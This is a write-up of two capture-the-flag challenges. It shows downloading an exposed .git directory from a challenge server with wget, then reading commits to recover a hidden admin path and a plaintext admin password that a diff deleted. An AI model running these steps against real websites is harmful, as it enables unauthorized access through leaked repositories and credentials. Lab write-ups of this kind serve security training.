# EG-CTF
# Write-Up
# 1-Tamp3rat0r
I have check the site and They asked me about username and password and by guess seems like http authentication bypass
and worked. check Tamp3rat0r.py
# 2-Hold Up
i test it with DWP and i found /.git path working and i download the directory
root@cloudshell:~$ wget --recursive --no-parent http://172.105.76.128/.git/
root@cloudshell:~$ ls
172.105.76.128  
root@cloudshell:~$ cd 172.105.76.128/
root@cloudshell:~/172.105.76.128$ ls -a
.  ..  .git
root@cloudshell:~/172.105.76.128$ cd .git/
root@cloudshell:~/172.105.76.128/.git$ ls
branches        config       HEAD   index       index.html?C=D;O=A  index.html?C=M;O=A  index.html?C=N;O=A  index.html?C=S;O=A  info  objects
COMMIT_EDITMSG  description  hooks  index.html  index.html?C=D;O=D  index.html?C=M;O=D  index.html?C=N;O=D  index.html?C=S;O=D  logs  refs
// let's check the commits
root@cloudshell:~/172.105.76.128/.git$ git reflog
2e3e1a8 HEAD@{0}: commit: Refining
89329fa HEAD@{1}: commit: NewFeature
dfecece HEAD@{2}: commit: Addinfo
b032cf8 HEAD@{3}: commit: Disable
5b9e491 HEAD@{4}: commit: DelCr
457168f HEAD@{5}: commit: AddUsetting
b55d897 HEAD@{6}: commit: editconf
70ae358 HEAD@{7}: commit (initial): initials
// i have check this commits one by one and i found 
root@cloudshell:~/172.105.76.128/.git$git show 2e3e1a8
commit 2e3e1a8c124768ecbb31e92d5c070003924b9254
Author: Ben ALaa <a.alaa@egcert.eg>
Date:   Thu Nov 14 23:18:26 2019 +0100

    Refining

diff --git a/S3cR3tPaTh/config.php b/S3cR3tPaTh/config.php
index 3d7f801..706d93b 100644
--- a/S3cR3tPaTh/config.php
+++ b/S3cR3tPaTh/config.php
@@ -420,15 +420,6 @@ $CONFIG = array(
 'overwriteprotocol' => '',

 /**
- * Override webroot
- * ownCloud attempts to detect the webroot for generating URLs automatically.
- * For example, if `www.example.com/owncloud` is the URL pointing to the
- * ownCloud instance, the webroot is `/owncloud`. When proxies are in use, it
- * may be difficult for ownCloud to detect this parameter, resulting in invalid URLs.
- */
-'overwritewebroot' => '',
-
-/
   Override condition
   This option allows you to define a manual override condition as a regular
   expression for the remote IP address. The keys `overwritewebroot`,
// this show us the path of admin log in is /S3cR3tPaTh/
root@cloudshell:~/172.105.76.128/.git$git show 5b9e491
commit 5b9e491802d53d6af1ef25206ccb0765b64a248b
Author: Ben ALaa <a.alaa@egcert.eg>
Date:   Thu Nov 14 23:15:11 2019 +0100

    DelCr

diff --git a/S3cR3tPaTh/config.php b/S3cR3tPaTh/config.php
index 46ed4f3..72e9842 100644
--- a/S3cR3tPaTh/config.php
+++ b/S3cR3tPaTh/config.php
@@ -194,7 +194,7 @@ $CONFIG = array(
 'knowledgebaseenabled' => true,

 /**
- * Enables or disables avatars or user profile photos
+ /* Enables or disables avatars or user profile photos
  * `true` enables avatars, or user profile photos, `false` disables them.
  * These appear on the User page, on user's Personal pages and are used by some apps
  * (contacts, mail, etc).
@@ -469,15 +469,7 @@ $CONFIG = array(



-
- Admin Credentials
-
-'Admin_Login' => 'Administrator'
-'Admin_Password' => 'FN3ym@bZNaF&'

/////////////////////////////////////////////////////////////////
admin = Administrator
password = FN3ym@bZNaF&
after i try it #flag : EGCTF{Co0o0o0L_I_g0t_Th3_R3p0}
sorry if something it's not clear
//////////////////////////////////////////////////////////////////
